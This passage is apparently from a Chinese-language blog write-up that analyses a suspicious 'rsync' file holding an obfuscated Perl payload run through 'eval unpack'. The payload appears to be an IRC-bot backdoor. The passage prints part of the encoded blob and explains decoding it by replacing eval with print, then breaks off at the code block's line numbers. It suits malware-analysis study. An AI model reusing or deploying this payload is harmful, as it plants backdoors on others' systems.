2`Q,#(T.PH@(&quot;`@)&#x27;-E;F1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^;F5W*$QI_&lt;W1E;CT^,2P@3&amp;]C86Q0;W)T(#T^)&#x27;!O&lt;G1A+&quot;!0&lt;F]T;R`]/B`G=&amp;-P)RD@86YD(&quot;1D8V-?&lt;V5L+3YA9&amp;0H_)&#x27;-E;F1S;V-K*3L*(&quot;!](&#x27;5N=&amp;EL(&quot;1S96YD&lt;V]C:SL*&quot;B`@)$1#0WLD&lt;V5N9&#x27;-O8VM]&gt;W1I&lt;&amp;]](#T@)W-E_;F0G.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MB&gt;71E&lt;WT@_/2`D&lt;VEZ95]T;W1A;#L*(&quot;`D1$-#&gt;R1S96YD&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*&quot;@H@(&quot;8Z.F-T_8W`H(B1N:6-K(BP@(D1#0R!314Y$(&quot;1D8V-A&lt;FL@)&amp;QO;F=I&lt;&quot;`D&lt;&amp;]R=&amp;$@)&#x27;-I&gt;F5?=&amp;]T86PB*3L*&quot;GT*_&quot;G-U8B!&#x27;150@&gt;PH@(&amp;UY(&quot;@D87)Q=6EV;RP@)&amp;1C8VQO;F=I&lt;&quot;P@)&amp;1C8W!O&lt;G1A+&quot;`D8GET97,L(&quot;1N:6-K_*2`]($!?.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H+64@(B1A&lt;G%U:79O(BD[&quot;B`@:68@*&amp;]P96XH1DE,12P@(CX@)&amp;%R_&lt;75I=F\\B*2D@&gt;PH@(&quot;`@(&amp;-L;W-E($9)3$4[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&#x27;)E=&#x27;5R;B@P*3L*(&quot;!]&quot;@H@(&amp;UY_(&quot;1D8V-I&lt;#UF:7AA9&amp;1R*&quot;1D8V-L;VYG:7`I.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H)&amp;1C8W!O&lt;G1A(#P@,3`R-&quot;!O_&lt;B!N;W0@9&amp;5F:6YE9&quot;`D9&amp;-C:7`@;W(@)&amp;)Y=&amp;5S(#P@,2D[&quot;B`@;7D@)&amp;1C8W-O8VL@/2!)3SHZ4V]C:V5T_.CI)3D54+3YN97&lt;H4&#x27;)O=&amp;\\]/B)T8W`B+&quot;!0965R061D&lt;CT^)&amp;1C8VEP+&quot;!0965R4&amp;]R=#T^)&amp;1C8W!O&lt;G1A_+&quot;!4:6UE;W5T/3XQ-2D@;W(@&lt;F5T=7)N(&quot;@P*3L*(&quot;`D9&amp;-C&lt;V]C:RT^875T;V9L=7-H*#$I.PH@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&amp;1C8W-O8VLI.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W1I&lt;&amp;]](#T@)V=E=&quot;&lt;[&quot;B`@)$1#0WLD9&amp;-C_&lt;V]C:WU[:71I;65](#T@=&amp;EM93L*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&amp;1C_8W-O8VM]&gt;V)Y=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MC=7)B&gt;71E?2`](#`[&quot;B`@)$1#0WLD_9&amp;-C&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MI&lt;&#x27;T@/2`D9&amp;-C:7`[&quot;B`@_)$1#0WLD9&amp;-C&lt;V]C:WU[&lt;&amp;]R=&amp;%](#T@)&amp;1C8W!O&lt;G1A.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W-T871U&lt;WT@/2`B_4F5C96)E;F1O(CL*?0H*&lt;W5B(%-T871U&lt;R![&quot;B`@;7D@)&#x27;-O8VME=&quot;`](&#x27;-H:69T.PH@(&amp;UY(&quot;1S;V-K7W1I_&lt;&amp;\\@/2`D1$-#&gt;R1S;V-K971]&gt;W1I&lt;&amp;]].PH@(&#x27;5N;&amp;5S&lt;R`H;&amp;,H)&#x27;-O8VM?=&amp;EP;RD@97$@(F-H870B*2![_&quot;B`@(&quot;!M&gt;2`D;FEC:R`](&quot;1$0T-[)&#x27;-O8VME=&#x27;U[;FEC:WT[&quot;B`@(&quot;!M&gt;2`D87)Q=6EV;R`](&quot;1$0T-[)&#x27;-O_8VME=&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;!M&gt;2`D:71I;64@/2`D1$-#&gt;R1S;V-K971]&gt;VET:6UE?3L*(&quot;`@(&amp;UY(&quot;1F_=&amp;EM92`](&#x27;1I;64[&quot;B`@(&quot;!M&gt;2`D&lt;W1A=&#x27;5S(#T@)$1#0WLD&lt;V]C:V5T?7MS=&amp;%T=7-].PH@(&quot;`@)&amp;9T:6UE_(#T@)$1#0WLD&lt;V]C:V5T?7MF=&amp;EM97T@:68@9&amp;5F:6YE9&quot;@D1$-#&gt;R1S;V-K971]&gt;V9T:6UE?2D[&quot;@H@(&quot;`@_;7D@)&amp;1?=&amp;EM92`](&quot;1F=&amp;EM92TD:71I;64[&quot;@H@(&quot;`@;7D@)&amp;-U&lt;E]B&gt;71E(#T@)$1#0WLD&lt;V]C:V5T?7MC_=7)B&gt;71E?3L*(&quot;`@(&amp;UY(&quot;1B&gt;71E&lt;U]T;W1A;&quot;`](&quot;`D1$-#&gt;R1S;V-K971]&gt;V)Y=&amp;5S?3L*&quot;B`@(&quot;!M&gt;2`D_&lt;F%T92`](#`[&quot;B`@(&quot;`D&lt;F%T92`](&quot;@D8W5R7V)Y=&amp;4O,3`R-&quot;DO)&amp;1?=&amp;EM92!I9B`D8W5R7V)Y=&amp;4@/B`P_.PH@(&quot;`@;7D@)&#x27;!O&lt;F-E;B`](&quot;@D8W5R7V)Y=&amp;4J,3`P*2\\D8GET97-?=&amp;]T86P[&quot;@H@(&quot;`@;7D@*&quot;1R7V1U_=BP@)&#x27;!?9&#x27;5V*3L*(&quot;`@(&amp;EF(&quot;@D&lt;F%T92`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;E]D=78@/2`D,SL@)&#x27;)?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1R871E(#T@(B0Q7&quot;XD,B(N(B1R7V1U_=B([&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&#x27;!O&lt;F-E;B`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;%]D=78@/2`D,SL@)&#x27;!?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1P;W)C96X@/2`B)#%&lt;+B0R(BXB)&#x27;!?_9&#x27;5V(CL*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B@B)&#x27;-O8VM?=&amp;EP;R(L(B1S=&amp;%T=7,B+&quot;(D;FEC:R(L(B1A&lt;G%U:79O_(BPB)&amp;)Y=&amp;5S7W1O=&amp;%L(BP@(B1C=7)?8GET92(L(B1D7W1I;64B+&quot;`B)&#x27;)A=&amp;4B+&quot;`B)&#x27;!O&lt;F-E;B(I.PH@_(&#x27;T*&quot;@H@(&#x27;)E=&#x27;5R;B@P*3L*?0H*&quot;G-U8B!F:7AA9&amp;1R(&#x27;L*(&quot;`@(&amp;UY(&quot;@D861D&lt;F5S&lt;RD@/2!`7SL*&quot;B`@_(&quot;!C:&amp;]M&lt;&quot;`D861D&lt;F5S&lt;SL@(&quot;`@(`H@(&quot;`@:68@*&quot;1A9&amp;1R97-S(#U^(&quot;]&gt;7&amp;0K)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;!R_971U&lt;FX@:6YE=%]N=&amp;]A*&#x27;!A8VL@(DXB+&quot;`D861D&lt;F5S&lt;RD[&quot;B`@(&quot;!](&amp;5L&lt;VEF(&quot;@D861D&lt;F5S&lt;R`]?B`O_7ELQ,ET_7&amp;1[,2PR?5PN6S$R73]&lt;9&#x27;LQ+#)]7&quot;Y;,3)=/UQD&gt;S$L,GU&lt;+ELQ,ET_7&amp;1[,2PR?20O*2![&quot;B`@_(&quot;`@(&quot;`@&lt;F5T=7)N(&quot;1A9&amp;1R97-S.PH@(&quot;`@?2!E;&#x27;-I9B`H)&amp;%D9&#x27;)E&lt;W,@/7X@=&#x27;(O82UZ02U:+R\\I(&#x27;L@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(`H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!I;F5T7VYT;V$H*&quot;AG971H;W-T8GEN86UE*&quot;1AV9&amp;1R97-S*2E;-%TI6S!=*3L*(&quot;`@(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@&lt;F5T=7)N.PH@(&quot;`@?0I]&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>使用了 <code>eval unpack</code> 看起來是需要解密的東西</p>\n<p>發現 perl 有一個函數為 <code>unpack()</code></p>\n<p>所以我們將 開頭的 <code>eval</code> 掉換成 <code>print</code></p>\n<p>在使用 perl 執行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ perl rsync</span><br></pre></td></tr></table></figure>\n\n<p>順利把程式碼解出來了</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span 